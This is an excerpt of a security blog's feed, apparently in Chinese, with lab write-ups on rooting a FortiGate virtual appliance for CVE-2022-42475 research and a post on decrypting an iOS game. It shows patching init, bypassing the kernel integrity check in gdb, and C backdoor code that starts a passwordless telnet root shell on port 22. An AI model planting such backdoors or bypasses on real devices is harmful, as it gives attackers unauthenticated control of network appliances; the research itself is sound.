step2</li><li>为什么要分开构造 shellcode？为何不一次构造完成</li></ol><p>这么考虑的点是这样的，首先执行 execl 后会劫持程序，执行成功后不会返回错误会直接退出程序，而上述 payload 中没有用到 fork 来创建进程，从而程序执行完 execl 后会退出，无法继续跳转回原来的 payload 继续 rop 或者 ret2shellcode。</p><ol><li>有没有简单的拿后门方法？有替换 smartctl 为你的后门 binary，接着在登录后执行 <code>diagnose hardware smartctl arg1 arg2 ...</code> 的方式执行</li></ol><p>这里提供一个简单的</p><pre><code>#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;# gcc -g -static s.c -o sint main(int argc, char const *argv[])&#123;        execl(argv[1], argv[1], argv[2], argv[3], argv[4], argv[5], argv[6], NULL);        return 0;&#125;</code></pre>]]></content>
    
    
    <summary type="html">&lt;p&gt;首先需要进行环境搭建参考&lt;a href=&quot;https://ioo0s.art/2023/02/07/%E5%88%A9%E7%94%A8VMware%E8%8E%B7%E5%8F%96shell-%E8%BF%9B%E9%98%B6/&quot;&gt;获取 shell 进阶&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;以及调试环境搭建 &lt;a href=&quot;https://ioo0s.art/2023/02/09/gdb-server%E9%85%8D%E7%BD%AE/&quot;&gt;gdb-server 配置&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;复现过程&quot;&gt;&lt;a href=&quot;#复现过程&quot; class=&quot;headerlink&quot; title=&quot;复现过程&quot;&gt;&lt;/a&gt;复现过程&lt;/h2&gt;&lt;p&gt;根据文章 &lt;a href=&quot;https://wzt.ac.cn/2022/12/15/CVE-2022-42475/&quot;&gt;https://wzt.ac.cn/2022/12/15/CVE-2022-42475/&lt;/a&gt;，可以快速定位到可控制的溢出点，但是不同环境的原因 貌似溢出点地址有变，例如我 init 中在 &lt;code&gt;0000000001780BFB&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2023/02/09/CVE-2022-42475/static/boxcnX7t3Jx1WBzLwCgC1CWlFYf.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;调试 exp 时建议在此处下断点，不是百分百触发该位置，因为有时会覆盖到其他 结构位置 在赋值时导致错误。&lt;/p&gt;</summary>
    
    
    
    <category term="漏洞挖掘" scheme="http://ioo0s.art/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
    
    <category term="漏洞复现" scheme="http://ioo0s.art/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="IOT" scheme="http://ioo0s.art/tags/IOT/"/>
    
    <category term="FortiGate" scheme="http://ioo0s.art/tags/FortiGate/"/>
    
  </entry>
  
  <entry>
    <title>gdb-server配置</title>
    <link href="http://ioo0s.art/2023/02/09/gdb-server%E9%85%8D%E7%BD%AE/"/>
    <id>http://ioo0s.art/2023/02/09/gdb-server%E9%85%8D%E7%BD%AE/</id>
    <published>2023-02-09T02:35:27.000Z</published>
    <updated>2023-02-09T05:11:04.975Z</updated>
    
    <content type="html"><![CDATA[<p>需要满足以获取 shell，未获取请参考<a href="https://ioo0s.art/2023/02/07/%E5%88%A9%E7%94%A8VMware%E8%8E%B7%E5%8F%96shell-%E8%BF%9B%E9%98%B6/">利用VMware获取shell-进阶</a></p><span id="more"></span><ol><li>下载 gdb-server static 版本，这里选择下载 <code>gdbserver-7.10.1-x64</code></li></ol><p><a href="https://github.com/hugsy/gdb-static">gdb-static</a></p><ol><li>添加 gdb-server 到 rootfs 中并重打包</li></ol><pre><code>cp /path/to/gdbserver-7.10.1-x64 ./bin/gdbserverchmod 777 ./bin/gdbserverchroot . /sbin/ftar -cf bin.tar ./binrm -rf bin.tar.xzchroot . /sbin/xz --check=sha256 -e bin.tarfind . -path &#39;./bin&#39; -prune -o -print |cpio -H newc -o &gt; ../make/rootfs.rawcd ../makecat rootfs.raw | gzip &gt; rootfs.gz</code></pre><ol><li>启动 shell</li></ol><p>注意我们能从外访问到内部的端口是有限的，建议用 ssh 22 端口和 telnet 的 23 端口</p><pre><code>killall sshd &amp;&amp; /bin/busybox telnetd -l /bin/sh -b 0.0.0.0 -p 22</code></pre><p>默认 shell 是 22 端口 ,所以调试端口就用 23，使用 busybox ps -a 命令查看所有的进程 pid，确定 sslvpn 的 pid，接着并行执行两条命令附加调试</p><pre><code>killall telnetd &amp;&amp; gdbserver :23 --attach 1</code></pre><p>接着用 gdb 远程连接即可</p><pre><code>target remote 192.168.109.111:23</code></pre><p>最后就可以开启愉快地调试之旅了！！！</p><p><img src="/2023/02/09/gdb-server%E9%85%8D%E7%BD%AE/boxcnwfkKKcpcZWwMd4RJsAnhWd.png"></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
    
    
    <summary type="html">&lt;p&gt;需要满足以获取 shell，未获取请参考&lt;a href=&quot;https://ioo0s.art/2023/02/07/%E5%88%A9%E7%94%A8VMware%E8%8E%B7%E5%8F%96shell-%E8%BF%9B%E9%98%B6/&quot;&gt;利用VMware获取shell-进阶&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="基础知识" scheme="http://ioo0s.art/categories/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
    
    <category term="IOT" scheme="http://ioo0s.art/tags/IOT/"/>
    
    <category term="FortiGate" scheme="http://ioo0s.art/tags/FortiGate/"/>
    
  </entry>
  
  <entry>
    <title>Note</title>
    <link href="http://ioo0s.art/2023/02/07/Note/"/>
    <id>http://ioo0s.art/2023/02/07/Note/</id>
    <published>2023-02-07T07:18:26.000Z</published>
    <updated>2023-02-07T08:15:04.054Z</updated>
    
    <content type="html"><![CDATA[<h2 id="开博原因"><a href="#开博原因" class="headerlink" title="开博原因"></a>开博原因</h2><p>最近突然想分享几篇好玩的文章，尝试在csdn中发布（涂省事），但频繁提示我审核失败最终选择重新开一下博客，后续不定期更新😆😆😆</p><h2 id="历史博客"><a href="#历史博客" class="headerlink" title="历史博客"></a>历史博客</h2><p>有几篇还不错的历史文章，但因为原文.md丢失的原因在这里贴一下之前发布的链接</p><p><a href="https://blog.csdn.net/yinxuanwl/article/details/104583615">ios逆向入门笔记（详细到哭）</a></p><p><a href="https://blog.csdn.net/yinxuanwl/article/details/93474278">Reveal调试笔记</a></p><p><a href="https://blog.csdn.net/yinxuanwl/article/details/107724670">ios逆向入门笔记-HOOK-QQ登录</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;开博原因&quot;&gt;&lt;a href=&quot;#开博原因&quot; class=&quot;headerlink&quot; title=&quot;开博原因&quot;&gt;&lt;/a&gt;开博原因&lt;/h2&gt;&lt;p&gt;最近突然想分享几篇好玩的文章，尝试在csdn中发布（涂省事），但频繁提示我审核失败最终选择重新开一下博客，后续不定期更新😆</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>利用VMware获取shell-进阶</title>
    <link href="http://ioo0s.art/2023/02/07/%E5%88%A9%E7%94%A8VMware%E8%8E%B7%E5%8F%96shell-%E8%BF%9B%E9%98%B6/"/>
    <id>http://ioo0s.art/2023/02/07/%E5%88%A9%E7%94%A8VMware%E8%8E%B7%E5%8F%96shell-%E8%BF%9B%E9%98%B6/</id>
    <published>2023-02-07T02:24:18.000Z</published>
    <updated>2023-02-09T05:11:41.314Z</updated>
    
    <content type="html"><![CDATA[<h2 id="解包"><a href="#解包" class="headerlink" title="解包"></a>解包</h2><pre><code>gzip -d rootfs.gzsudo cpio -idmv &lt; ./rootfssudo chroot . /sbin/xz --check=sha256 -d /bin.tar.xzsudo chroot . /sbin/ftar -xf /bin.tar</code></pre><h2 id="Patch-init-文件"><a href="#Patch-init-文件" class="headerlink" title="Patch init 文件"></a>Patch init 文件</h2><p>文件所在位置 <code>/bin/init</code> ,注意这个是解包后才能拿到的文件</p><p>patch 位置在 <code>0x04518E5</code></p><span id="more"></span><p><strong>将</strong><strong>jnz loc_451BB4</strong><strong> 改为 </strong><strong>jz loc_451BB4 </strong></p><p>下图是 patch 后的</p><p><img src="/2023/02/07/%E5%88%A9%E7%94%A8VMware%E8%8E%B7%E5%8F%96shell-%E8%BF%9B%E9%98%B6/boxcnp12KkCPJsgrJoFZ8uaZX15.png"></p><p>伪代码</p><p><img src="/2023/02/07/%E5%88%A9%E7%94%A8VMware%E8%8E%B7%E5%8F%96shell-%E8%BF%9B%E9%98%B6/boxcnPKVLs7SFq7xOzvSBaOiSTd.png"></p><p>另外一处也需要 patch</p><p><img src="/2023/02/07/%E5%88%A9%E7%94%A8VMware%E8%8E%B7%E5%8F%96shell-%E8%BF%9B%E9%98%B6/boxcnWZnG85SRFKyyydsEcCbI8b.png"></p><p>修改前</p><p><img src="/2023/02/07/%E5%88%A9%E7%94%A8VMware%E8%8E%B7%E5%8F%96shell-%E8%BF%9B%E9%98%B6/boxcnbIEedUGu0ily5S5emt7sL2.png"></p><p>修改后</p><p><img src="/2023/02/07/%E5%88%A9%E7%94%A8VMware%E8%8E%B7%E5%8F%96shell-%E8%BF%9B%E9%98%B6/boxcnwP6k0sGEU7X8Vi7zbcJHZc.png"></p><p>导出后替换原来的./bin/init 文件</p><h2 id="Patch-shell"><a href="#Patch-shell" class="headerlink" title="Patch shell"></a>Patch shell</h2><ol><li>下载编译 busybox</li></ol><p>下载地址：<a href="https://busybox.net/downloads/">https://busybox.net/downloads/</a></p><ol><li>预编译配置</li></ol><pre><code>make menuconfig</code></pre><ol><li>修改配置信息</li></ol><ul><li>Build Options —&gt; 选择[*] Build Busybox as a static binary（no shared libs）</li><li>去掉 Coreutils—&gt;sync 选项</li></ul><ol><li>编译</li></ol><pre><code>make make install</code></pre><p>编译成功 busybox 文件会在 <code>./_install/bin/busybox</code></p><ol><li>复制 busybox 到 rootfs 的/bin 目录下</li></ol><pre><code>cp ../busybox/busybox-1.35.0/_install/bin/busybox ./bin/chmod 777 ./bin/busybox</code></pre><ol><li>删除原 sh 软链并创建 busybox 软链</li></ol><pre><code>rm -rf ./bin/shls -n /bin/busybox sh</code></pre><h2 id="后门制作"><a href="#后门制作" class="headerlink" title="后门制作"></a>后门制作</h2><p>编译一段命令执行的 elf 文件，采用静态链接,这里最好使用 system 而不是 execv，因为 system 会附加 init 后的环境，execv 不会。前两条用于测试 busybox 是否正常，后一条用于添加个 shell</p><pre><code>#include &lt;stdio.h&gt;int tcp_port = 22;char *ip = &quot;192.168.109.143&quot;;void shell()&#123;                        system(&quot;/bin/busybox ls&quot;, 0, 0);        system(&quot;/bin/busybox id&quot;, 0, 0);        system(&quot;/bin/busybox killall sshd &amp;&amp; /bin/busybox telnetd -l /bin/sh -b 0.0.0.0 -p 22&quot;, 0, 0);        return;&#125;int main(int argc, char const *argv[])&#123;        shell();        return 0;&#125;</code></pre><p>编译</p><pre><code>gcc -g shell.c -static -o shell</code></pre><h2 id="打包"><a href="#打包" class="headerlink" title="打包"></a>打包</h2><pre><code>sudo chroot . /sbin/ftar -cf bin.tar ./binsudo chroot . /sbin/xz --check=sha256 -e bin.tarsu rootfind . -path &#39;./bin&#39; -prune -o -print |cpio -H newc -o &gt; ../make/rootfs.rawcd ../makecat rootfs.raw | gzip &gt; rootfs.gz</code></pre><h2 id="替换"><a href="#替换" class="headerlink" title="替换"></a>替换</h2><p>使用新虚拟机挂载当前 fortigate 的虚拟磁盘，<code>添加-&gt;现有虚拟磁盘</code>。</p><p><img src="/2023/02/07/%E5%88%A9%E7%94%A8VMware%E8%8E%B7%E5%8F%96shell-%E8%BF%9B%E9%98%B6/boxcnapM1bapHSvqn0lW4C9yKrb.png"></p><p>启动该虚拟机后，搜索应用 disk，选择对应大小的虚拟机磁盘，这里是 2G 的，然后选择启动挂载</p><p><img src="/2023/02/07/%E5%88%A9%E7%94%A8VMware%E8%8E%B7%E5%8F%96shell-%E8%BF%9B%E9%98%B6/boxcn7WU2xW82Oj1p5Hbwnay0pc.png"></p><p>替换 rootfs.gz 文件</p><pre><code>sudo sucp path/to/rootfs.gz ./</code></pre><p><img src="/2023/02/07/%E5%88%A9%E7%94%A8VMware%E8%8E%B7%E5%8F%96shell-%E8%BF%9B%E9%98%B6/boxcnUsHHryGKKYw1ESbN0QQQic.png"></p><p>关闭挂载或者挂起虚拟机</p><h2 id="GDB-内核-Patch"><a href="#GDB-内核-Patch" class="headerlink" title="GDB 内核 Patch"></a>GDB 内核 Patch</h2><p>绕过 fgt_verify，需要绕过下方跳转 jnz，可以在此处下断点并修改 rax=0 绕过</p><p><img src="/2023/02/07/%E5%88%A9%E7%94%A8VMware%E8%8E%B7%E5%8F%96shell-%E8%BF%9B%E9%98%B6/boxcn5sAHD8KFpwProizAdJzQef.png"></p><p>配置 vm 调试<a href="https://ioo0s.art/2023/02/06/%E5%88%A9%E7%94%A8VMware%E8%8E%B7%E5%8F%96shell/">利用VMware获取shell</a></p><pre><code>gdbpwndbg&gt; file /home/ios/Fortigate/vmlinuz_elfpwndbg&gt; b*0xFFFFFFFF807AC11Cpwndbg&gt; target remote 192.168.109.1:12345pwndbg&gt; c</code></pre><p>这里讲解一个技巧：什么时候执行 <code>target remote 192.168.109.1:12345</code> 下断，由于我们要 patch 的是 vmlinuz 中的验证，所以需要在屏幕输出 <code>Bootting the kernel</code> 后 1-2 秒再执行，如下图</p><p><img src="/2023/02/07/%E5%88%A9%E7%94%A8VMware%E8%8E%B7%E5%8F%96shell-%E8%BF%9B%E9%98%B6/boxcn7xNskTYXxPLewpZI9qYZgh.png"></p><p>触发断点</p><p><img src="/2023/02/07/%E5%88%A9%E7%94%A8VMware%E8%8E%B7%E5%8F%96shell-%E8%BF%9B%E9%98%B6/boxcnBipQCMHQH0iaVktQHTemDe.png"></p><p>修改 rax=0</p><pre><code>set $rax=0</code></pre><p><img src="/2023/02/07/%E5%88%A9%E7%94%A8VMware%E8%8E%B7%E5%8F%96shell-%E8%BF%9B%E9%98%B6/boxcnStvMa3M1EAJ5EPzp81Pijd.png"></p><p>测试能成功运行启动</p><p><img src="/2023/02/07/%E5%88%A9%E7%94%A8VMware%E8%8E%B7%E5%8F%96shell-%E8%BF%9B%E9%98%B6/boxcn9KGAaBQA5ul9xowbeeWnEe.png"></p><h2 id="运行到-shell"><a href="#运行到-shell" class="headerlink" title="运行到 shell"></a>运行到 shell</h2><p>登录到 cli，执行 <code>diag hardware smartctl</code></p><p><img src="/2023/02/07/%E5%88%A9%E7%94%A8VMware%E8%8E%B7%E5%8F%96shell-%E8%BF%9B%E9%98%B6/boxcnzkFMwkKiJ46wEidtckK0Yc.png"></p><p>查看结果</p><p><img src="/2023/02/07/%E5%88%A9%E7%94%A8VMware%E8%8E%B7%E5%8F%96shell-%E8%BF%9B%E9%98%B6/boxcnd0fwycUWKwy9OLeWct0ozb.png"></p><p>尝试用 telnet 连接后门，注意端口是 22！！！！需要指定一下端口</p><pre><code>telnet 192.168.109.111 22</code></pre><p>这里的 ip 是在 cli 中配置后的，可以参考基础配置文章</p><p><img src="/2023/02/07/%E5%88%A9%E7%94%A8VMware%E8%8E%B7%E5%8F%96shell-%E8%BF%9B%E9%98%B6/boxcnurjgBpjiLl8gmglgbyGXoh.png"></p><p>注意：获取 shell 后还需要借助 busybox 来执行其他命令，如图，直接执行会找不到软链</p><h2 id="遇到问题"><a href="#遇到问题" class="headerlink" title="遇到问题"></a>遇到问题</h2><h3 id="EDD：Error-0400-reading-sector"><a href="#EDD：Error-0400-reading-sector" class="headerlink" title="EDD：Error 0400 reading sector"></a>EDD：Error 0400 reading sector</h3><p><img src="/2023/02/07/%E5%88%A9%E7%94%A8VMware%E8%8E%B7%E5%8F%96shell-%E8%BF%9B%E9%98%B6/boxcnHOHJZiPH1zqyAitv9rD4Oc.png"></p><h4 id="造成原因"><a href="#造成原因" class="headerlink" title="造成原因"></a>造成原因</h4><p>使用 windows 下的 diskgenius 替换 rootfs 导致</p><h4 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h4><p>使用另一台 linux 虚拟机 挂载虚拟磁盘，并复制进去</p><h3 id="偶尔出现-cpio-打包-blocks-打包前后不相同的问题"><a href="#偶尔出现-cpio-打包-blocks-打包前后不相同的问题" class="headerlink" title="偶尔出现 cpio 打包 blocks 打包前后不相同的问题"></a>偶尔出现 cpio 打包 blocks 打包前后不相同的问题</h3><h3 id="同上-该问题会导致虚拟机启动后-无任何提示-无限重启"><a href="#同上-该问题会导致虚拟机启动后-无任何提示-无限重启" class="headerlink" title="同上 该问题会导致虚拟机启动后 无任何提示 无限重启"></a>同上 该问题会导致虚拟机启动后 无任何提示 无限重启</h3><h4 id="造成原因-1"><a href="#造成原因-1" class="headerlink" title="造成原因"></a>造成原因</h4><p>在 vmlinuz 中存在一处 fgtsum 校验,具体位置在 <code>0xFFFFFFFF807AC117</code> 。</p><p><img src="/2023/02/07/%E5%88%A9%E7%94%A8VMware%E8%8E%B7%E5%8F%96shell-%E8%BF%9B%E9%98%B6/boxcnPqwpD4h8M029MQkMiPh9Kc.png"></p><h4 id="解决方法-1"><a href="#解决方法-1" class="headerlink" title="解决方法"></a>解决方法</h4><p>在 <code>0xFFFFFFFF807AC117</code> 处下断，用 gdb 修改 eax 值为 0，即可绕过验证</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;解包&quot;&gt;&lt;a href=&quot;#解包&quot; class=&quot;headerlink&quot; title=&quot;解包&quot;&gt;&lt;/a&gt;解包&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;gzip -d rootfs.gz
sudo cpio -idmv &amp;lt; ./rootfs
sudo chroot . /sbin/xz --check=sha256 -d /bin.tar.xz
sudo chroot . /sbin/ftar -xf /bin.tar
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;Patch-init-文件&quot;&gt;&lt;a href=&quot;#Patch-init-文件&quot; class=&quot;headerlink&quot; title=&quot;Patch init 文件&quot;&gt;&lt;/a&gt;Patch init 文件&lt;/h2&gt;&lt;p&gt;文件所在位置 &lt;code&gt;/bin/init&lt;/code&gt; ,注意这个是解包后才能拿到的文件&lt;/p&gt;
&lt;p&gt;patch 位置在 &lt;code&gt;0x04518E5&lt;/code&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="基础知识" scheme="http://ioo0s.art/categories/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
    
    <category term="IOT" scheme="http://ioo0s.art/tags/IOT/"/>
    
    <category term="FortiGate" scheme="http://ioo0s.art/tags/FortiGate/"/>
    
  </entry>
  
  <entry>
    <title>利用VMware获取shell</title>
    <link href="http://ioo0s.art/2023/02/06/%E5%88%A9%E7%94%A8VMware%E8%8E%B7%E5%8F%96shell/"/>
    <id>http://ioo0s.art/2023/02/06/%E5%88%A9%E7%94%A8VMware%E8%8E%B7%E5%8F%96shell/</id>
    <published>2023-02-06T05:46:36.000Z</published>
    <updated>2023-02-07T02:20:12.153Z</updated>
    
    <content type="html"><![CDATA[<h2 id="获取-vmlinuz"><a href="#获取-vmlinuz" class="headerlink" title="获取 vmlinuz"></a>获取 vmlinuz</h2><h3 id="方式一"><a href="#方式一" class="headerlink" title="方式一"></a>方式一</h3><p>对于 vmdk 没有加密的虚拟设备来说，可以直接通过挂载磁盘的方式提取出 vmlinuz 文件，但是要注意磁盘中的内核文件命名可能不同！！！</p><p><img src="/2023/02/06/%E5%88%A9%E7%94%A8VMware%E8%8E%B7%E5%8F%96shell/boxcn2cjTeNLk3cdxSy6yrkdxef.png"></p><span id="more"></span><p>使用 DiskGenius 挂载虚拟磁盘，通过寻找 vmlinuz 文件的特征信息来确定具体文件</p><p><img src="/2023/02/06/%E5%88%A9%E7%94%A8VMware%E8%8E%B7%E5%8F%96shell/boxcn2BG3thFFguLDkrSTwqWYec.png"></p><p>一般情况 vmlinuz 文件头部 会含有上图中的字符串信息，或者通过头标识符也可以判断文件，所以 flatkc 就是该环境中的 vmlinuz 文件，右键导出即可。</p><p>使用工具 <a href="https://github.com/marin-m/vmlinux-to-elf">vmlinux-to-elf</a> 可以将内核文件转换为 elf 文件，方便我们接下来的逆向分析。</p><p><strong>注意：请不要用该方法得到的 rootfs.gz 直接解压使用，否则后期打包时会出现问题！！！</strong></p><h3 id="方式二"><a href="#方式二" class="headerlink" title="方式二"></a>方式二</h3><p>将虚拟磁盘挂载到其他虚拟机中，并启动虚拟机</p><p><img src="/2023/02/06/%E5%88%A9%E7%94%A8VMware%E8%8E%B7%E5%8F%96shell/boxcnqDzrAcy5Krj2XG5AtXfIYf.png"></p><p>搜索并打开 <code>disk</code> 应用</p><p><img src="/2023/02/06/%E5%88%A9%E7%94%A8VMware%E8%8E%B7%E5%8F%96shell/boxcnrSJtNfKhxmlPUYySXku1fb.png"></p><p><img src="/2023/02/06/%E5%88%A9%E7%94%A8VMware%E8%8E%B7%E5%8F%96shell/boxcnxDdp9wGX6NZjcGaHH1KPUd.png"></p><p>找到新添加的硬盘后，点击启动按钮，接着硬盘会被挂载，进而得到 rootfs 和 vmlinuz</p><p><img src="/2023/02/06/%E5%88%A9%E7%94%A8VMware%E8%8E%B7%E5%8F%96shell/boxcnOVM9ShpKe6aUI4bRyywlde.png"></p><h2 id="寻找断点函数"><a href="#寻找断点函数" class="headerlink" title="寻找断点函数"></a>寻找断点函数</h2><p>加载 vmlinux_elf 文件到 ida 中进行分析。</p><p>通常 vmlinuz 初始化流程中最后一步，内核会执行 init_post 函数。其中在该函数中最终会执行/sbin/init。</p><p><img src="/2023/02/06/%E5%88%A9%E7%94%A8VMware%E8%8E%B7%E5%8F%96shell/boxcnbwMuK4CGzX6yDzpIb9PuEf.png"></p><p>记录该函数地址 <code>FFFFFFFF807AC0E9</code> ,为了接下来调试做准备</p><p><img src="/2023/02/06/%E5%88%A9%E7%94%A8VMware%E8%8E%B7%E5%8F%96shell/boxcnCjVKc5j2byi1YAp9jxrcWh.png"></p><h2 id="配置-vm-调试信息"><a href="#配置-vm-调试信息" class="headerlink" title="配置 vm 调试信息"></a>配置 vm 调试信息</h2><pre><code>debugStub.listen.guest64 = &quot;TRUE&quot;debugStub.listen.guest64.remote = &quot;TRUE&quot;debugStub.port.guest64 = &quot;12345&quot;debugStub.listen.guest32 = &quot;TRUE&quot;debugStub.listen.guest32.remote = &quot;TRUE&quot;debugStub.port.guest32 = &quot;12346&quot;</code></pre><p><img src="/2023/02/06/%E5%88%A9%E7%94%A8VMware%E8%8E%B7%E5%8F%96shell/boxcn54fRCjoOOehEJ0l7llpG6e.png"></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;获取-vmlinuz&quot;&gt;&lt;a href=&quot;#获取-vmlinuz&quot; class=&quot;headerlink&quot; title=&quot;获取 vmlinuz&quot;&gt;&lt;/a&gt;获取 vmlinuz&lt;/h2&gt;&lt;h3 id=&quot;方式一&quot;&gt;&lt;a href=&quot;#方式一&quot; class=&quot;headerlink&quot; title=&quot;方式一&quot;&gt;&lt;/a&gt;方式一&lt;/h3&gt;&lt;p&gt;对于 vmdk 没有加密的虚拟设备来说，可以直接通过挂载磁盘的方式提取出 vmlinuz 文件，但是要注意磁盘中的内核文件命名可能不同！！！&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2023/02/06/%E5%88%A9%E7%94%A8VMware%E8%8E%B7%E5%8F%96shell/boxcn2cjTeNLk3cdxSy6yrkdxef.png&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="基础知识" scheme="http://ioo0s.art/categories/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
    
    <category term="IOT" scheme="http://ioo0s.art/tags/IOT/"/>
    
    <category term="FortiGate" scheme="http://ioo0s.art/tags/FortiGate/"/>
    
  </entry>
  
  <entry>
    <title>王铲铲的致富之路-逆向分析</title>
    <link href="http://ioo0s.art/2023/02/06/%E7%8E%8B%E9%93%B2%E9%93%B2%E7%9A%84%E8%87%B4%E5%AF%8C%E4%B9%8B%E8%B7%AF-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/"/>
    <id>http://ioo0s.art/2023/02/06/%E7%8E%8B%E9%93%B2%E9%93%B2%E7%9A%84%E8%87%B4%E5%AF%8C%E4%B9%8B%E8%B7%AF-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/</id>
    <published>2023-02-06T03:10:52.000Z</published>
    <updated>2023-02-06T06:11:08.190Z</updated>
    
    <content type="html"><![CDATA[<h2 id="游戏介绍"><a href="#游戏介绍" class="headerlink" title="游戏介绍"></a>游戏介绍</h2><p>版本：1.2.4<br>设备：xsmax<br>游戏环境：Unity</p><span id="more"></span><h3 id="游戏玩法"><a href="#游戏玩法" class="headerlink" title="游戏玩法"></a>游戏玩法</h3><p>看着他挖，但是你需要钱去升级设备、场子等等，总之有钱！这个游戏就是你的天下！！！</p><p>游戏不需要额外充钱，但是会一直有广告</p><p><img src="/2023/02/06/%E7%8E%8B%E9%93%B2%E9%93%B2%E7%9A%84%E8%87%B4%E5%AF%8C%E4%B9%8B%E8%B7%AF-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/boxcnJ17FucdZKSiH6x0ChWdZQd.png"></p><h2 id="逆向过程"><a href="#逆向过程" class="headerlink" title="逆向过程"></a>逆向过程</h2><h3 id="砸壳"><a href="#砸壳" class="headerlink" title="砸壳"></a>砸壳</h3><p>获取未加密APP</p><h4 id="砸壳环境"><a href="#砸壳环境" class="headerlink" title="砸壳环境"></a>砸壳环境</h4><ol><li>实体机 xsmax 系统版本 14.8 已经越狱</li><li>Mac os 环境 需要装<strong>usbmuxd</strong><strong>，</strong><em>Windows 下没找到能解决该问题的方法</em></li><li>均安装 frida 同一版本就行</li><li>Frida-ios-dump</li></ol><h4 id="开始砸壳"><a href="#开始砸壳" class="headerlink" title="开始砸壳"></a>开始砸壳</h4><ol><li>确保 frida 能正常连通</li></ol><p>使用 usb 连接手机设备，使用命令 <code>frida-ps -U</code> 该命令用于查看 USB 连接设备当前运行的进程。</p><p>待补充图</p><ol><li>使用 iproxy 命令转发 22 端口，<code>iproxy 2222 22</code></li></ol><p><img src="/2023/02/06/%E7%8E%8B%E9%93%B2%E9%93%B2%E7%9A%84%E8%87%B4%E5%AF%8C%E4%B9%8B%E8%B7%AF-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/boxcn0RZDt8j3nK46J3dKip84Le.png"></p><ol><li>修改 Frida-ios-dump 脚本中的 root 密码</li><li>输入命令 <code>python dump.py -l</code> 列出当前设备中的应用程序</li></ol><p><img src="/2023/02/06/%E7%8E%8B%E9%93%B2%E9%93%B2%E7%9A%84%E8%87%B4%E5%AF%8C%E4%B9%8B%E8%B7%AF-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/boxcncd3lDAxThVjkRnfRXbvT7e.png"></p><ol><li>输入命令 <code>python dump.py com.mojike.digearth</code> ，开始砸壳</li></ol><p><img src="/2023/02/06/%E7%8E%8B%E9%93%B2%E9%93%B2%E7%9A%84%E8%87%B4%E5%AF%8C%E4%B9%8B%E8%B7%AF-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/boxcnBdRrzbav42e0hDHn1Stvx1.png"></p><h3 id="解包分析"><a href="#解包分析" class="headerlink" title="解包分析"></a>解包分析</h3><p>复制 dump 中的 ipa 文件到 Windows 下，进行下一步分析。</p><p>首先重命名.ipa 为.zip 并解压</p><p><img src="/2023/02/06/%E7%8E%8B%E9%93%B2%E9%93%B2%E7%9A%84%E8%87%B4%E5%AF%8C%E4%B9%8B%E8%B7%AF-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/boxcnag2Z25uOhh6sj96vHGjINe.png"></p><p>简单说明一下重要的目录结构，该游戏是 Unity 开发。</p><h4 id="Data-目录"><a href="#Data-目录" class="headerlink" title="Data 目录"></a>Data 目录</h4><p><img src="/2023/02/06/%E7%8E%8B%E9%93%B2%E9%93%B2%E7%9A%84%E8%87%B4%E5%AF%8C%E4%B9%8B%E8%B7%AF-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/boxcnqU56Sk9q7lCmgiS47dD58f.png"></p><p><code>data.unity3d</code> 文件是游戏的资源文件，可以通过 <code>AssetStudio.net6</code>  或者 <code>AssetRipper_win_x64</code> 进行查看或者分析</p><p><code>RaW</code> 文件夹里面放着一些分享时的图片资源</p><p><code>Managed</code> 文件夹放着 ll2cpp 生成后的文件 非常重要！！！</p><p><code>mono</code> 放着数据库相关文件</p><h4 id="Frameworks-目录"><a href="#Frameworks-目录" class="headerlink" title="Frameworks 目录"></a>Frameworks 目录</h4><p><img src="/2023/02/06/%E7%8E%8B%E9%93%B2%E9%93%B2%E7%9A%84%E8%87%B4%E5%AF%8C%E4%B9%8B%E8%B7%AF-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/boxcnyfJ63JIN5VypLEzOF4uMwb.png"></p><p><code>UnityFramework.framework</code> 里面放着游戏编译后的 object-c 程序 很重要</p><p><code>KSAdSDK.framework</code> 广告框架，没有详细 研究</p><p><code>TTNetworkManager.framework</code> 网络相关，没有详细研究</p><h3 id="ll2cpp-反编译"><a href="#ll2cpp-反编译" class="headerlink" title="ll2cpp 反编译"></a>ll2cpp 反编译</h3><p>利用 <code>Il2CppDumper-net6-v6.7.25 </code> 进行反编译</p><p><strong>可执行文件位置</strong></p><p><img src="/2023/02/06/%E7%8E%8B%E9%93%B2%E9%93%B2%E7%9A%84%E8%87%B4%E5%AF%8C%E4%B9%8B%E8%B7%AF-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/boxcnPDeYAgcm7Zt8BWMEW6Mbtc.png"></p><p>符号表数据位置 <code>global-metadata.dat</code></p><p><img 